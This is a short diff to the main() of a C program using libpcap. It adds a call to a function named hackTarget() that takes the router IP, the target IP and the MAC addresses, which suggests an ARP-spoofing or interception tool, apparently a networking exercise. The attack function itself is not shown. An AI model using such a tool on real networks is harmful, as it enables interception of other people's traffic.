@@ -27,7 +27,7 @@ int main(int argc, char* argv[]) {
   uint8_t * src_ip = parseIP(argv[2]);
   uint8_t * des_ip = parseIP(argv[3]);
   printf("%u.%u.%u.%u", src_ip[0],src_ip[1],src_ip[2],src_ip[3]);
-  
+
   uint8_t * router_ip = getRouterIPAddress();
   printf("%u.%u.%u.%u", router_ip[0],router_ip[1],router_ip[2],router_ip[3]);
 
@@ -42,6 +42,8 @@ int main(int argc, char* argv[]) {
   u_char * target_mac_address = getTargetMacAddress(handle, sender_mac_address, src_ip, des_ip);
   char text3[30] = "Target Mac Address : ";
   printMacAddress(target_mac_address, text3);
+
+  hackTarget(handle, sender_mac_address, target_mac_address, router_ip, des_ip);
 
   pcap_close(handle);
   return 0;
